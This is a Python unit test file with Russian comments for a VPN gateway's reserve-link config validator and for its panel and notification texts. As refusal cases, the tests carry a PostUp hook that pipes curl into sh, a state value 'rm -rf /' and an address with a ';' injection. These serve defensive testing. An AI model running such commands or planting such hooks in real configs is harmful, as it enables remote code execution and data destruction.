"""Раздел reserve документа конфигурации шлюза — проверка на шлюзе
(gwcfg.check_reserve) и строки агента: панель Т-РА1, уведомления этапа
голосования без точки в конце.

Цена ошибки: конфиг линка к резерву с PostUp или без Table = off — команда
или маршрут по умолчанию на шлюзе от сервера; доля в точке резерва (x = 1)
или аварийного кода (x = 255) у шлюза — шлюз вместе с резервом или с кодом
собирает ключ без аварии; неизвестное состояние пересылки, принятое как
есть, — решение о пересылке по мусору.
"""
from __future__ import annotations

import pytest

from awgbot.bot.texts.gateway import panel
from awgbot.domain import gwcfg
from awgbot.domain.notices import reserve as rn
from awgbot.util import wgkeys

pytestmark = pytest.mark.unit


def _conf(extra: str = "", table: str = "Table = off\n", endpoint: str = "Endpoint = 198.51.100.7:45001\n") -> str:
    priv, _ = wgkeys.keypair()
    _, pub = wgkeys.keypair()
    return (f"[Interface]\nAddress = 10.99.97.2/30\nPrivateKey = {priv}\n{table}Jc = 5\n{extra}\n"
            f"[Peer]\nPublicKey = {pub}\nPresharedKey = {wgkeys.psk()}\nAllowedIPs = 10.99.97.1/32\n"
            f"{endpoint}PersistentKeepalive = 25-35\n")


def _sec(**over) -> dict:
    sec = {"self": "203.0.113.10", "state": "idle", "move": 0, "name": "Beta", "slot": 1,
           "record": "vpn-a.example.org", "peer_host": "198.51.100.7",
           "share": {"x": 2, "y": "cd" * 16, "gen": 1}, "link": {"conf": _conf()}}
    sec.update(over)
    return gwcfg.parse({"gen": 1, "hash": "ab" * 8, "reserve": sec})["sections"]["reserve"]


def test_a_good_section_passes_and_renders_the_conf_by_the_allow_list():
    out = gwcfg.check_reserve(_sec())
    assert out["state"] == "idle" and out["share"] == {"x": 2, "y": "cd" * 16, "gen": 1}
    assert "Table = off" in out["conf_text"] and "PersistentKeepalive = 25-35" in out["conf_text"]


@pytest.mark.parametrize("conf,why", [
    (_conf(extra="PostUp = curl https://example.org/x | sh\n"), "PostUp"),
    (_conf(table=""), "Table"),
    (_conf(table="Table = 100\n"), "Table"),
    (_conf(endpoint=""), "Endpoint"),
    (_conf(extra="DNS = 203.0.113.53\n"), "DNS"),
], ids=["postup", "no_table", "table_100", "no_endpoint", "dns"])
def test_a_link_conf_outside_the_allow_list_is_refused(conf, why):
    with pytest.raises(gwcfg.CfgError):
        gwcfg.check_reserve(_sec(link={"conf": conf}))


@pytest.mark.parametrize("share", [
    {"x": 1, "y": "cd" * 16, "gen": 1}, {"x": 255, "y": "cd" * 16, "gen": 1},
    {"x": 2, "y": "cd" * 15, "gen": 1}, {"x": 2, "y": "cd" * 16, "gen": 0}],
    ids=["reserve_point", "code_point", "short", "no_generation"])
def test_a_share_not_of_a_gateway_point_is_refused(share):
    with pytest.raises(gwcfg.CfgError):
        gwcfg.check_reserve(_sec(share=share))


def test_no_share_yet_is_fine_and_a_non_hex_share_is_dropped_at_parsing():
    assert gwcfg.check_reserve(_sec(share={}))["share"] == {}
    assert gwcfg.check_reserve(_sec(share={"x": 2, "y": "zz" * 16, "gen": 1}))["share"] == {}, \
        "доля не hex легла на шлюз как есть"


@pytest.mark.parametrize("state", ["serving", "open", "rm -rf /"])
def test_an_unknown_forwarding_state_is_refused(state):
    with pytest.raises(gwcfg.CfgError):
        gwcfg.check_reserve(_sec(state=state))


def test_a_primary_address_that_is_not_an_address_is_refused():
    with pytest.raises(gwcfg.CfgError):
        gwcfg.check_reserve(_sec(**{"self": "a b;c"}))


def test_the_section_has_a_human_name():
    assert "reserve" in gwcfg.SECTIONS and gwcfg.human("reserve")


# ── Т-РА1 ───────────────────────────────────────────────────────────────────

def test_the_panel_line_by_state():
    assert panel.reserve_panel_line({}) == "", "строка резерва без раздела"
    ok = panel.reserve_panel_line({"name": "Beta", "seen": "ok", "share": True})
    assert ok == "🛟 Резерв «Beta»: на связи · часть ключа есть"
    assert "части ключа ещё нет" in panel.reserve_panel_line({"name": "Beta", "seen": "ok", "share": False})
    down = panel.reserve_panel_line({"name": "Beta", "seen": "down", "since": "2026-10-21T13:58:00+03:00"})
    assert down.startswith("⚠️ Резерв «Beta»: нет связи с ") and down.endswith("этот шлюз не голосует")
    moved = panel.reserve_panel_line({"name": "Beta", "seen": "ok", "open": True, "rx": 5_000_000, "tx": 1_000_000,
                                      "since_open": "2026-10-21T03:12:00+03:00"})
    assert moved.startswith("🛟 Резерв «Beta»: пользователи на нём с ") and "через резервный линк" in moved
    assert "<" not in panel.reserve_panel_line({"name": "<b>x</b>", "seen": "ok"}), "имя резерва не экранировано"


# ── уведомления этапа без точки в конце ─────────────────────────────────────

S = "2026-10-21T03:11:00+03:00"
U = "2026-10-21T03:26:00+03:00"
TEXTS = {
    "gateway_reserve_down": rn.gateway_reserve_down("NASPi", "Beta", S),
    "gateways_reserve_all_down": rn.gateways_reserve_all_down("Beta", S),
    "gateway_reserve_up": rn.gateway_reserve_up("NASPi", "Beta"),
    "code_needed_reserve": rn.code_needed_reserve("Alpha", S, True),
    "code_needed_reserve_unopened": rn.code_needed_reserve("Alpha", S, False),
    "code_needed_primary": rn.code_needed_primary("Alpha", "Beta", S),
    "code_window_closed_sees": rn.code_window_closed("Alpha", "gw_sees"),
    "code_window_closed_unseen": rn.code_window_closed("Alpha", "gw_unseen"),
    "code_window_closed": rn.code_window_closed("Alpha", "primary_seen"),
    "code_wrong": rn.code_wrong(2),
    "code_open_failed": rn.code_open_failed("Alpha", "зона: veth"),
    "rf_block_warning_one": rn.rf_block_warning("Beta", ["NASPi"], S, U),
    "rf_block_warning_two": rn.rf_block_warning("Beta", ["NASPi", "Pi5"], S, U),
    "nogw_warning": rn.nogw_warning("Beta", S, U),
    "case4_notice": rn.case4_notice("Beta", ["NASPi"], ["Pi5"], S),
    "ask_refused_3": rn.ask_refused("Beta", "3", S, link_if="awglink"),
    "ask_refused_nogw": rn.ask_refused("Beta", "nogw", S, reserve_ip="198.51.100.7"),
    "gateway_moved_dead": rn.gateway_moved("Beta", "dead", S, record="vpn-a.example.org", ip="198.51.100.7"),
    "gateway_moved_rf": rn.gateway_moved("Beta", "rf", S),
    "gateway_moved_partial": rn.gateway_moved("Beta", "partial", S, others={"unseen": ["Шлюз 2"]}),
    "gateway_moved_nogw": rn.gateway_moved("Beta", "nogw", S),
    "gateway_rf_warning": rn.gateway_rf_warning("Beta", S, U),
    "gateway_case4": rn.gateway_case4("Beta", S, ["Шлюз 2"]),
    "gateway_move_failed": rn.gateway_move_failed("Beta", S, "запись не сменилась"),
}


@pytest.mark.parametrize("name", list(TEXTS))
def test_notices_of_the_voting_stage_have_no_final_period_and_no_holes(name):
    text = TEXTS[name]
    assert text and not text.rstrip().endswith("."), f"{name}: точка в конце уведомления"
    assert "{" not in text and "None" not in text, f"{name}: недоподставленная строка"


# ── порт гостевого канала (chan) ────────────────────────────────────────────

def test_the_channel_port_of_the_reserve_rides_the_section_and_its_print():
    """Порт гостевого канала резерва — в разделе: шлюз ходит на него; без
    поля в отпечатке смена порта не доехала бы до стоящего раздела."""
    assert gwcfg.check_reserve(_sec(chan=8791))["chan"] == 8791
    assert gwcfg.check_reserve(_sec())["chan"] == 0, "раздел прежнего сервера без chan — 0, порт по умолчанию"
    base = _sec()
    assert gwcfg.reserve_print(base), "отпечаток пуст — сравнивать нечего"
    assert gwcfg.reserve_print({**base, "chan": 8791}) != gwcfg.reserve_print({**base, "chan": 8787})


@pytest.mark.parametrize("chan", [70000, -1, "много"])
def test_a_channel_port_out_of_range_is_zero_not_an_error(chan):
    assert gwcfg.check_reserve(_sec(chan=chan))["chan"] == 0
